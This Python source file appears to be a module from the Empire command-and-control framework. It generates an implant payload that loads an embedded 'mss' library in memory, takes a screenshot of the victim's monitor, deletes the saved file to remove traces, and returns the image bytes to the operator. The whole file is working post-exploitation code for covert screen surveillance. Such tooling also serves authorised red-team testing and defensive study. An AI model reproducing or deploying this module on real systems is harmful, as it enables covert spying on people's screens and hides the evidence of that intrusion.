import base64

from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ) -> tuple[str | None, str | None]:
        path = main_menu.install_path / "data/misc/python_modules/mss.zip"
        module_data = path.read_bytes()
        module_data = base64.b64encode(module_data)
        return """
import os
import base64
data = "{}"
def run(data):
    rawmodule = base64.b64decode(data)
    zf = zipfile.ZipFile(io.BytesIO(rawmodule), "r")
    if "mss" not in moduleRepo.keys():
        moduleRepo["mss"] = zf
        install_hook("mss")

    from mss import mss
    m = mss()
    file = m.shot(mon={},output='{}')
    raw = open(file, 'rb').read()
    run_command('rm -f %s' % (file))
    print(raw)

run(data)
""".format(
            module_data,
            params["Monitor"],
            params["SavePath"],
        )
